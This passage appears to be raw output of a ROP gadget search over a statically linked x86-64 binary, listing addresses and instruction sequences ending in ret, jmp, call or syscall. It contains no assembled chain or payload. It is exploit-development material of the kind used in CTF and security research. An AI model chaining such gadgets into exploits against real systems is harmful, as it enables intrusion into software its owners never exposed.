0x000000000045137c : mov esi, 0x48891b52 ; push rax ; mov dword ptr [rax + 0x54], edx ; ret
0x00000000004a8da6 : mov esi, 0x497b96cc ; retf 0x99e0
0x000000000041d4de : mov esi, 0x53b48c0 ; pop rcx ; ret
0x000000000047597f : mov esi, 0x5401 ; mov eax, ecx ; syscall
0x00000000004a8e43 : mov esi, 0x6400fd4c ; retf 0xf64
0x0000000000495080 : mov esi, 0x64fffa2e ; cli ; jmp rsp
0x00000000004a6f2a : mov esi, 0x6a25743d ; scasd eax, dword ptr [rdi] ; xlatb ; out 0xb3, al ; retf 0xe80
0x000000000044c788 : mov esi, 0x80 ; syscall
0x0000000000450532 : mov esi, 0x83480147 ; ret
0x000000000047e8a9 : mov esi, 0xaf0f4907 ; retf 0x14c
0x0000000000494551 : mov esi, 0xbfe0fff9 ; stc ; jmp rax
0x0000000000494531 : mov esi, 0xc020fff9 ; stc ; jmp qword ptr [rax]
0x00000000004647ce : mov esi, 0xc08349c8 ; add dword ptr [rcx], edi ; retf
0x00000000004944d1 : mov esi, 0xc0c0fff9 ; stc ; inc eax ; ret 0xfff9
0x00000000004944b1 : mov esi, 0xc0e0fff9 ; stc ; jmp rax
0x00000000004a63be : mov esi, 0xc2c1c0bf ; ret
0x0000000000448994 : mov esi, 0xf000000 ; lahf ; ret 0xea81
0x000000000045a08e : mov esi, 0xf883fffa ; inc dword ptr [rcx - 0x77] ; ret 0x840f
0x0000000000460f6c : mov esi, 1 ; jmp rax
0x000000000046f04c : mov esi, 1 ; mov rdi, rbx ; call rax
0x000000000044afc8 : mov esi, 2 ; jmp rax
0x000000000044afdb : mov esi, 3 ; pop rbp ; pop r12 ; jmp rax
0x0000000000459964 : mov esi, dword ptr [rax + rsi*8] ; test rsi, rsi ; je 0x459976 ; call rsi
0x000000000048d65d : mov esi, dword ptr [rbp - 0x10] ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x000000000044f9ae : mov esi, dword ptr [rbp - 0x70] ; call rsi
0x000000000048ef3b : mov esi, dword ptr [rdi] ; mov rdi, qword ptr [rsp + 0x10] ; call r14
0x000000000048dde5 : mov esi, dword ptr [rsi] ; call r12
0x0000000000447893 : mov esi, dword ptr [rsi] ; mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x000000000044f0c6 : mov esi, dword ptr [rsp + 0x18] ; mov r9, r13 ; call rbx
0x00000000004231a1 : mov esi, dword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x0000000000452254 : mov esi, dword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x0000000000451d84 : mov esi, dword ptr [rsp + 0x40] ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x0000000000456761 : mov esi, dword ptr [rsp + 0x48] ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x0000000000420bb9 : mov esi, dword ptr [rsp + 0x68] ; call rax
0x0000000000400589 : mov esi, eax ; repe cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x400598 ; ret
0x000000000044a24c : mov esi, ebp ; mov edi, ebx ; mov eax, 1 ; syscall
0x000000000044a17c : mov esi, ebp ; mov edi, ebx ; xor eax, eax ; syscall
0x0000000000414244 : mov esi, ebp ; mov rdi, r14 ; call 0x4004af
0x0000000000423e21 : mov esi, ebp ; mov rdi, rax ; call rcx
0x00000000004227d2 : mov esi, ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; jmp rax
0x0000000000424167 : mov esi, ebp ; pop rbx ; pop rbp ; mov rdi, rax ; jmp 0x400441
0x0000000000412de9 : mov esi, ebx ; mov edi, r13d ; mov eax, r9d ; syscall
0x0000000000422340 : mov esi, ebx ; mov rdi, r13 ; call 0x41e587
0x000000000047fba0 : mov esi, ebx ; syscall
0x000000000044acb5 : mov esi, edi ; mov eax, 0x12e ; xor edi, edi ; syscall
0x0000000000449fc2 : mov esi, edi ; mov edi, 0xffffff9c ; syscall
0x000000000048dcda : mov esi, edi ; mov edi, 1 ; jmp rax
0x000000000045dd88 : mov esi, edi ; mov rdi, qword ptr [rbp - 0x8a8] ; call rax
0x000000000047e803 : mov esi, edx ; cmp rcx, rsi ; jne 0x47e7e8 ; ret
0x0000000000449eec : mov esi, edx ; mov eax, 4 ; syscall
0x0000000000449f3a : mov esi, edx ; mov eax, 5 ; syscall
0x00000000004756bc : mov esi, edx ; mov eax, 6 ; syscall
0x0000000000465191 : mov esi, esi ; mov rdi, qword ptr [rbp - 0xc0] ; call rax
0x000000000048dd31 : mov esi, esi ; mov rdi, r12 ; call r15
0x0000000000489b9c : mov esi, esp ; mov edi, ebp ; call qword ptr [r14]
0x0000000000489c70 : mov esi, esp ; mov edi, ebp ; call qword ptr [rax]
0x0000000000489d4c : mov esi, esp ; mov edi, ebp ; call qword ptr [rcx]
0x0000000000489b56 : mov esi, esp ; mov edi, ebp ; call rax
0x0000000000470edc : mov esi, esp ; mov rdi, rbx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x000000000040d3cb : mov esp, 0x24448b48 ; sub byte ptr [rax - 0x7d], cl ; ret
0x0000000000420089 : mov esp, 0x29 ; add byte ptr [rax], al ; ret
0x000000000042bca1 : mov esp, 0x448d48c0 ; cmp al, dh ; ret
0x000000000042bcd1 : mov esp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x000000000042bcc1 : mov esp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x0000000000494ac0 : mov esp, 0x62fffa08 ; adc dl, bh ; jmp rdx
0x000000000040272b : mov esp, 0x8024 ; add al, ch ; retf 0xbfd8
0x00000000004182c2 : mov esp, 0x8c48348 ; pop rbx ; pop rbp ; ret
0x0000000000451f9d : mov esp, 0x9824 ; add byte ptr [rax + 0xf], cl ; ret
0x000000000045241f : mov esp, 0xa824 ; add byte ptr [rax + 0xf], cl ; ret
0x000000000049454d : mov esp, 0xbe10fff9 ; stc ; jmp rax
0x000000000049452d : mov esp, 0xbe50fff9 ; stc ; jmp qword ptr [rax]
0x00000000004413e3 : mov esp, 0xd00148d2 ; sub rax, rdi ; ret
0x000000000046fe54 : mov esp, 0xd824 ; add byte ptr [rax - 0x39], cl ; ret 0xac20
0x000000000042bd8b : mov esp, 0xf80148c0 ; add rax, rcx ; ret
0x000000000042bcb1 : mov esp, 0xf80148c0 ; ret
0x000000000042c1a2 : mov esp, 0xf80148c0 ; vzeroupper ; ret
0x00000000004007e6 : mov esp, eax ; call 0x448988
0x00000000004006af : mov esp, eax ; call 0x448e48
0x000000000048282a : mov esp, eax ; mov rbp, r9 ; nop ; jmp rdx
0x000000000048d7e7 : mov esp, ecx ; ret
0x000000000044b570 : mov esp, esi ; call r15
0x000000000045322d : mov fs, word ptr [rbx] ; add eax, 0x29480000 ; ret 0x349
0x00000000004577ad : mov gs, esi ; add al, 0 ; add byte ptr [rax + 0x29], cl ; ret 0x349
0x000000000048af53 : mov qword ptr [r10], r8 ; ret
0x0000000000438e50 : mov qword ptr [r9 - 8], rcx ; ret
0x000000000044c8c0 : mov qword ptr [rax + 0x10], rcx ; mov qword ptr [rax + 8], rdx ; ret
0x0000000000470b28 : mov qword ptr [rax + 0x10], rdx ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000470b68 : mov qword ptr [rax + 0x10], rsi ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000471b67 : mov qword ptr [rax + 0x18], rdx ; mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x000000000044c926 : mov qword ptr [rax + 0x20], rcx ; mov byte ptr [rax + 0x28], 1 ; ret
0x000000000044c940 : mov qword ptr [rax + 0x20], rsi ; ret
0x0000000000470b2c : mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000471be9 : mov qword ptr [rax + 0x48], 0 ; pop rbx ; ret
0x0000000000417d44 : mov qword ptr [rax + 8], 0 ; ret
0x000000000044c8c4 : mov qword ptr [rax + 8], rdx ; ret
0x0000000000484f7c : mov qword ptr [rax], rdi ; pop rbx ; ret
0x0000000000484ecc : mov qword ptr [rax], rdx ; add rsp, 8 ; ret
0x0000000000484f70 : mov qword ptr [rax], rdx ; pop rbx ; ret
0x000000000048d301 : mov qword ptr [rax], rdx ; ret
0x0000000000471eda : mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x000000000047c7f0 : mov qword ptr [rbp - 0x100], r11 ; call r10
0x000000000048113e : mov qword ptr [rbp - 0x78], rax ; mov eax, 0x15 ; syscall
0x000000000047d190 : mov qword ptr [rbp - 0xe0], r11 ; call r10
0x0000000000459051 : mov qword ptr [rbx + 0x10], 0 ; pop rbx ; ret
0x0000000000413336 : mov qword ptr [rbx + 0x10], rax ; mov rax, rbx ; pop rbx ; ret
0x0000000000481ded : mov qword ptr [rbx + 0x10], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x000000000041371e : mov qword ptr [rbx + 0x10], rax ; xor eax, eax ; pop rbx ; ret
0x000000000047fadd : mov qword ptr [rbx + 0x10], rdx ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000485c82 : mov qword ptr [rbx + 0x18], 0 ; jmp 0x485c58
0x0000000000481d22 : mov qword ptr [rbx + 0x18], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x0000000000488514 : mov qword ptr [rbx + 0x18], rax ; pop rbx ; ret
0x00000000004885e8 : mov qword ptr [rbx + 0x20], rax ; pop rbx ; ret
0x0000000000416ec0 : mov qword ptr [rbx + 0x50], 0 ; pop rbx ; ret
0x0000000000418b5c : mov qword ptr [rbx + 0x60], rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000485742 : mov qword ptr [rbx], rax ; add rsp, 0x10 ; pop rbx ; ret
0x000000000048a548 : mov qword ptr [rbx], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x00000000004109e0 : mov qword ptr [rcx + 0x130], rdx ; ret
0x000000000048304e : mov qword ptr [rdi + 0x10], r9 ; ret
0x00000000004452cc : mov qword ptr [rdi + 0x10], rcx ; lea rax, [rdi + 0x17] ; ret
0x0000000000444c3c : mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x0000000000444c1c : mov qword ptr [rdi + 0x10], rcx ; ret
0x0000000000444c7f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x0000000000444c9f : mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x0000000000444c60 : mov qword ptr [rdi + 0x10], rdx ; mov word ptr [rdi + 0x18], cx ; ret
0x0000000000416da2 : mov qword ptr [rdi + 0x18], rax ; mov qword ptr [rdi + 8], rax ; ret
0x000000000047b794 : mov qword ptr [rdi + 0x300], rax ; ret
0x000000000047b766 : mov qword ptr [rdi + 0x308], rax ; ret
0x0000000000416dd2 : mov qword ptr [rdi + 0x48], rdx ; mov qword ptr [rdi + 8], rax ; ret
0x000000000048d340 : mov qword ptr [rdi + 0x98], rsi ; ret
0x000000000044528c : mov qword ptr [rdi + 0xe], rcx ; lea rax, [rdi + 0x15] ; ret
0x0000000000444bdc : mov qword ptr [rdi + 0xe], rcx ; ret
0x00000000004452ac : mov qword ptr [rdi + 0xf], rcx ; lea rax, [rdi + 0x16] ; ret
0x0000000000444bfc : mov qword ptr [rdi + 0xf], rcx ; ret
0x0000000000435e37 : mov qword ptr [rdi + 1], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000435dc7 : mov qword ptr [rdi + 2], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000435d57 : mov qword ptr [rdi + 3], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000435ce7 : mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000044518a : mov qword ptr [rdi + 5], rdx ; lea rax, [rdi + 0xc] ; ret
0x0000000000435c77 : mov qword ptr [rdi + 5], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000444b2a : mov qword ptr [rdi + 5], rdx ; ret
0x00000000004451aa : mov qword ptr [rdi + 6], rdx ; lea rax, [rdi + 0xd] ; ret
0x0000000000435c07 : mov qword ptr [rdi + 6], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000444b3a : mov qword ptr [rdi + 6], rdx ; ret
0x00000000004451ca : mov qword ptr [rdi + 7], rdx ; lea rax, [rdi + 0xe] ; ret
0x0000000000435b97 : mov qword ptr [rdi + 7], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000444b4a : mov qword ptr [rdi + 7], rdx ; ret
0x0000000000484473 : mov qword ptr [rdi + 8], r10 ; mov eax, ecx ; adc eax, eax ; ret
0x0000000000482fd3 : mov qword ptr [rdi + 8], r9 ; ret
0x00000000004847bd : mov qword ptr [rdi + 8], rax ; mov eax, 2 ; ret
0x0000000000416da6 : mov qword ptr [rdi + 8], rax ; ret
0x00000000004485fa : mov qword ptr [rdi + rdx - 8], rcx ; mov qword ptr [rdi], rcx ; ret
0x0000000000447886 : mov qword ptr [rdi + rdx - 8], rcx ; mov qword ptr [rdi], rsi ; ret
0x000000000048d2eb : mov qword ptr [rdi + rsi*8], rdx ; ret
0x000000000042faa4 : mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000042fae2 : mov qword ptr [rdi - 0x10], r11 ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000482f3e : mov qword ptr [rdi - 0x10], r9 ; ret
0x000000000042fe2b : mov qword ptr [rdi - 0xa], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435647 : mov qword ptr [rdi - 0xa], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000043000b : mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004355c7 : mov qword ptr [rdi - 0xb], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004301fb : mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435547 : mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004303cc : mov qword ptr [rdi - 0xd], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x00000000004354b8 : mov qword ptr [rdi - 0xd], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00000000004305cc : mov qword ptr [rdi - 0xe], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000435428 : mov qword ptr [rdi - 0xe], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x00000000004307cc : mov qword ptr [rdi - 0xf], rcx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000435398 : mov qword ptr [rdi - 0xf], rdx ; mov qword ptr [rdi - 8], rcx ; ret
0x0000000000482ec9 : mov qword ptr [rdi - 8], r9 ; ret
0x000000000042faa8 : mov qword ptr [rdi - 8], rcx ; ret
0x000000000042fae6 : mov qword ptr [rdi - 8], rdx ; ret
0x000000000042fc5b : mov qword ptr [rdi - 9], r8 ; mov dword ptr [rdi - 4], edx ; ret
0x000000000042fd57 : mov qword ptr [rdi - 9], rcx ; mov byte ptr [rdi - 1], dl ; ret
0x000000000042fca3 : mov qword ptr [rdi - 9], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004356c7 : mov qword ptr [rdi - 9], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000468809 : mov qword ptr [rdi], r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000482e98 : mov qword ptr [rdi], r9 ; ret
0x0000000000445116 : mov qword ptr [rdi], rcx ; lea rax, [rdi + 8] ; ret
0x0000000000444b06 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; ret
0x0000000000444b16 : mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; ret
0x0000000000444b27 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 5], rdx ; ret
0x0000000000444b37 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 6], rdx ; ret
0x0000000000444b47 : mov qword ptr [rdi], rcx ; mov qword ptr [rdi + 7], rdx ; ret
0x0000000000444af7 : mov qword ptr [rdi], rcx ; mov word ptr [rdi + 8], dx ; ret
0x0000000000435b9b : mov qword ptr [rdi], rcx ; ret
0x000000000044877e : mov qword ptr [rdi], rcx ; vzeroupper ; ret
0x0000000000445103 : mov qword ptr [rdi], rdx ; lea rax, [rdi + 7] ; ret
0x0000000000435ea3 : mov qword ptr [rdi], rdx ; ret
0x0000000000438e4d : mov qword ptr [rdi], rsi ; mov qword ptr [r9 - 8], rcx ; ret
0x000000000044788b : mov qword ptr [rdi], rsi ; ret
0x00000000004133b4 : mov qword ptr [rdx + 0x130], rdi ; pop rbx ; ret
0x00000000004446aa : mov qword ptr [rdx + 5], rax ; lea rax, [rdx + 0xc] ; ret
0x0000000000442e9a : mov qword ptr [rdx + 5], rax ; mov rax, rdi ; ret
0x00000000004446ca : mov qword ptr [rdx + 6], rax ; lea rax, [rdx + 0xd] ; ret
0x0000000000442eba : mov qword ptr [rdx + 6], rax ; mov rax, rdi ; ret
0x00000000004446ea : mov qword ptr [rdx + 7], rax ; lea rax, [rdx + 0xe] ; ret
0x0000000000442eda : mov qword ptr [rdx + 7], rax ; mov rax, rdi ; ret
0x000000000046b45f : mov qword ptr [rdx + 8], rax ; jmp 0x46b435
0x000000000044457a : mov qword ptr [rdx + 8], rax ; lea rax, [rdx + 0xf] ; ret
0x0000000000442dca : mov qword ptr [rdx + 8], rax ; mov rax, rdi ; ret
0x0000000000418ccf : mov qword ptr [rdx + 8], rax ; xor eax, eax ; ret
0x0000000000444523 : mov qword ptr [rdx], rax ; lea rax, [rdx + 7] ; ret
0x0000000000442d73 : mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x0000000000484f5c : mov qword ptr [rdx], rax ; pop rbx ; ret
0x0000000000418c37 : mov qword ptr [rdx], rax ; ret
0x0000000000484aa7 : mov qword ptr [rip + 0x2375ba], rax ; ret
0x000000000047f3b4 : mov qword ptr [rip + 0x23cff5], rax ; ret
0x00000000004200e5 : mov qword ptr [rip + 0x299774], rax ; ret
0x000000000041a00b : mov qword ptr [rip + 0x29f84e], rax ; ret
0x0000000000419b06 : mov qword ptr [rip + 0x29fce3], rax ; ret
0x0000000000419ade : mov qword ptr [rip + 0x29fd03], rax ; ret
0x0000000000419abe : mov qword ptr [rip + 0x29fd1b], rax ; ret
0x00000000004199b4 : mov qword ptr [rip + 0x29fe8d], rax ; ret
0x00000000004199a4 : mov qword ptr [rip + 0x29fe95], rax ; ret
0x0000000000419992 : mov qword ptr [rip + 0x29fe97], rdx ; ret
0x0000000000419954 : mov qword ptr [rip + 0x29fe9d], rax ; ret
0x0000000000419944 : mov qword ptr [rip + 0x29feb5], rax ; ret
0x00000000004018b2 : mov qword ptr [rsi + 0x10], rsi ; syscall
0x0000000000478980 : mov qword ptr [rsi], -1 ; xor eax, eax ; ret
0x000000000047f521 : mov qword ptr [rsi], rax ; ret
0x000000000047e868 : mov qword ptr [rsi], rdi ; mov rax, rcx ; ret
0x000000000040f5a9 : mov qword ptr [rsi], rdi ; xor eax, eax ; jmp 0x40f577
0x0000000000451a6b : mov qword ptr [rsp + 0x50], rax ; call 0x44dd47
0x000000000041d2ae : mov qword ptr [rsp + 8], rax ; call rcx
0x000000000040962a : mov qword ptr [rsp + 8], rcx ; call 0x406137
0x0000000000411b3d : mov qword ptr [rsp + 8], rcx ; mov rdi, r15 ; call rax
0x0000000000489cf2 : mov qword ptr [rsp], r8 ; mov rsi, r12 ; mov edi, ebp ; call rax
0x0000000000413c11 : mov qword ptr [rsp], rcx ; mov rdi, rbx ; call rax
0x0000000000416f24 : mov qword ptr [rsp], rdi ; call 0x4131b6
0x000000000045b455 : mov qword ptr fs:[rdx], rax ; ret
0x0000000000447885 : mov qword ptr ss:[rdi + rdx - 8], rcx ; mov qword ptr [rdi], rsi ; ret
0x000000000044c5f0 : mov r10, rcx ; mov eax, 0x19 ; syscall
0x0000000000435806 : mov r10d, 0x46f00ff2 ; retf 0xff3
0x0000000000430601 : mov r10d, 0x4f7f0ff3 ; retf 0x894c
0x00000000004a729d : mov r10d, 0xcac982a4 ; call 0xffffffffaf0d111f
0x000000000045b6e3 : mov r10d, 8 ; mov eax, ecx ; syscall
0x0000000000435886 : mov r11d, 0x46f00ff2 ; retf
0x0000000000430401 : mov r11d, 0x4f7f0ff3 ; retf
0x000000000040f50b : mov r11d, 1 ; jmp 0x40f4dc
0x000000000040fc43 : mov r11d, 1 ; jmp 0x40fc14
0x00000000004007e5 : mov r12, rax ; call 0x448989
0x00000000004006ae : mov r12, rax ; call 0x448e49
0x000000000044b56f : mov r12d, r14d ; call r15
0x000000000048d65c : mov r14, qword ptr [rbp - 0x10] ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x000000000048d660 : mov r15, qword ptr [rbp - 8] ; leave ; ret
0x00000000004057c8 : mov r15, r12 ; jmp 0x40579b
0x000000000048af50 : mov r8, qword ptr [r8] ; mov qword ptr [r10], r8 ; ret
0x000000000048d90e : mov r8b, 0xe8 ; retf
0x000000000044f0ca : mov r9, r13 ; call rbx
0x0000000000474384 : mov r9, r14 ; call rbx
0x00000000004181d0 : mov rax, -1 ; ret
0x000000000045b620 : mov rax, 0xf ; syscall
0x00000000004749a0 : mov rax, 1 ; ret
0x00000000004749b0 : mov rax, 2 ; ret
0x00000000004749c0 : mov rax, 3 ; ret
0x00000000004749d0 : mov rax, 4 ; ret
0x00000000004749e0 : mov rax, 5 ; ret
0x00000000004749f0 : mov rax, 6 ; ret
0x0000000000474a00 : mov rax, 7 ; ret
0x0000000000486dbe : mov rax, qword ptr [r12] ; add rax, qword ptr [rdx + 8] ; call rax
0x000000000047cd35 : mov rax, qword ptr [r15 + 0x10] ; add rax, qword ptr [r14] ; call rax
0x00000000004120d0 : mov rax, qword ptr [rax + 0x20] ; jmp rax
0x0000000000471ff3 : mov rax, qword ptr [rax + 0x4c] ; ret
0x0000000000481be0 : mov rax, qword ptr [rax + 8] ; ret
0x0000000000459a5f : mov rax, qword ptr [rax + rbp*8] ; test rax, rax ; je 0x459a73 ; call rax
0x000000000046be09 : mov rax, qword ptr [rax + rcx*8] ; mov ecx, 1 ; jmp rax
0x000000000045b46e : mov rax, qword ptr [rax + rdi*8 + 0x80] ; ret
0x00000000004609dc : mov rax, qword ptr [rax + rdi*8] ; jmp rax
0x000000000048d292 : mov rax, qword ptr [rax] ; ret
0x000000000047c550 : mov rax, qword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x0000000000416f0c : mov rax, qword ptr [rbx + 0x18] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x0000000000484f78 : mov rax, qword ptr [rbx + 0x18] ; mov qword ptr [rax], rdi ; pop rbx ; ret
0x00000000004175f8 : mov rax, qword ptr [rbx + 0x40] ; add rsp, 0x20 ; pop rbx ; jmp rax
0x0000000000442d70 : mov rax, qword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x0000000000490e7c : mov rax, qword ptr [rdi + 0x20] ; test rax, rax ; je 0x490e95 ; call rax
0x0000000000471ff0 : mov rax, qword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x0000000000418f90 : mov rax, qword ptr [rdi + 0x68] ; ret
0x000000000048d2c0 : mov rax, qword ptr [rdi + 0x90] ; ret
0x000000000048d310 : mov rax, qword ptr [rdi + 0x98] ; ret
0x000000000048d350 : mov rax, qword ptr [rdi + 0xa0] ; ret
0x000000000048d3b0 : mov rax, qword ptr [rdi + 0xa8] ; ret
0x000000000048d3a0 : mov rax, qword ptr [rdi + 0xb0] ; ret
0x000000000048d360 : mov rax, qword ptr [rdi + 0xb8] ; ret
0x0000000000460f1e : mov rax, qword ptr [rdi + rax*8] ; jmp rax
0x0000000000487e30 : mov rax, qword ptr [rdi] ; cmp rax, rsi ; je 0x487e49 ; ret
0x0000000000418c34 : mov rax, qword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x0000000000418c20 : mov rax, qword ptr [rdx] ; test rax, rax ; jne 0x418c21 ; ret
0x000000000047f4a9 : mov rax, qword ptr [rip + 0x23cf00] ; ret
0x00000000004582d0 : mov rax, qword ptr [rip + 0x263ba1] ; ret
0x000000000044fdd0 : mov rax, qword ptr [rip + 0x26cb51] ; ret
0x0000000000418f70 : mov rax, qword ptr [rip + 0x2a01a9] ; ret
0x000000000048e201 : mov rax, qword ptr [rsi + 0x10] ; ret
0x000000000048b090 : mov rax, qword ptr [rsi + 0xa8] ; ret
0x000000000048b063 : mov rax, qword ptr [rsi + 0xb0] ; ret
0x000000000048b080 : mov rax, qword ptr [rsi + 0xb8] ; ret
0x000000000048e220 : mov rax, qword ptr [rsi + 8] ; ret
0x000000000046bdce : mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x0000000000460f68 : mov rax, qword ptr [rsi + rax*8] ; mov esi, 1 ; jmp rax
0x00000000004615c8 : mov rax, qword ptr [rsi + rax*8] ; xor esi, esi ; jmp rax
0x000000000048d385 : mov rax, qword ptr [rsp + 0x10] ; add rsp, 0x28 ; ret
0x000000000044b135 : mov rax, qword ptr [rsp + 0x10] ; call rax
0x0000000000401232 : mov rax, qword ptr [rsp + 0x18] ; call rax
0x00000000004539db : mov rax, qword ptr [rsp + 0x20] ; call rax
0x000000000040e01c : mov rax, qword ptr [rsp + 8] ; call rax
0x000000000048aaf9 : mov rax, qword ptr [rsp] ; add rsp, 0x38 ; ret
0x000000000046ede7 : mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000044b4fd : mov rax, r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041b1df : mov rax, r8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000422fbe : mov rax, r8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000473bc0 : mov rax, r8 ; vzeroupper ; ret
0x000000000044bb13 : mov rax, rbp ; pop rbx ; pop rbp ; jmp rax
0x0000000000410ba2 : mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000414646 : mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048d4ba : mov rax, rbp ; pop rbx ; pop rbp ; ret
0x0000000000415091 : mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000414fc4 : mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044ad4f : mov rax, rbx ; pop rbx ; pop rbp ; ret
0x000000000041333a : mov rax, rbx ; pop rbx ; ret
0x000000000047e86b : mov rax, rcx ; ret
0x0000000000413232 : mov rax, rdi ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041b474 : mov rax, rdi ; pop rbp ; pop r12 ; ret
0x0000000000413263 : mov rax, rdi ; ret
0x000000000041b074 : mov rax, rdx ; add rsp, 8 ; ret
0x000000000047544a : mov rax, rdx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041aa2c : mov rax, rdx ; pop rbx ; pop rbp ; ret
0x0000000000448b05 : mov rax, rdx ; pop rbx ; ret
0x000000000041b080 : mov rax, rdx ; ret
0x000000000041e53c : mov rax, rsi ; pop rbx ; ret
0x000000000041e570 : mov rax, rsi ; ret
0x000000000048d7e2 : mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x000000000048ea29 : mov rbp, qword ptr [rsp + 8] ; jmp 0x48ea49
0x000000000048282c : mov rbp, r9 ; nop ; jmp rdx
0x000000000046ff48 : mov rbp, rax ; jmp 0x46ff13
0x000000000047e535 : mov rbp, rax ; jmp 0x47e508
0x000000000045ae65 : mov rbx, rdi ; test rax, rax ; je 0x45ae77 ; call rax
0x00000000004754ff : mov rbx, rsi ; sub rsp, 8 ; syscall
0x000000000047fb9c : mov rbx, rsp ; mov rsi, rbx ; syscall
0x0000000000444ae0 : mov rcx, qword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x0000000000481cd6 : mov rcx, qword ptr [rsp + 0x40] ; add rsp, 0x48 ; jmp qword ptr [rax]
0x0000000000481c64 : mov rcx, qword ptr [rsp + 0x40] ; add rsp, 0x58 ; jmp qword ptr [rax]
0x0000000000472600 : mov rcx, rax ; jmp 0x4725cc
0x0000000000447861 : mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000044bc2b : mov rdi, qword ptr [r13] ; call r12
0x000000000040e018 : mov rdi, qword ptr [r13] ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000040eab3 : mov rdi, qword ptr [rax + 0x20] ; call rdx
0x000000000044b56b : mov rdi, qword ptr [rbp - 0x58] ; mov r12d, r14d ; call r15
0x000000000045dd8a : mov rdi, qword ptr [rbp - 0x8a8] ; call rax
0x00000000004692bc : mov rdi, qword ptr [rbp - 0x8d0] ; call rax
0x0000000000465193 : mov rdi, qword ptr [rbp - 0xc0] ; call rax
0x000000000044b053 : mov rdi, qword ptr [rbp] ; call r12
0x000000000044b02d : mov rdi, qword ptr [rbx] ; call r12
0x000000000048847e : mov rdi, qword ptr [rsp + 0x10] ; call 0x484eb7
0x000000000048ef3d : mov rdi, qword ptr [rsp + 0x10] ; call r14
0x00000000004517a4 : mov rdi, qword ptr [rsp + 0x20] ; call r15
0x0000000000452080 : mov rdi, qword ptr [rsp + 0x30] ; call r14
0x0000000000452258 : mov rdi, qword ptr [rsp + 0x30] ; call rbx
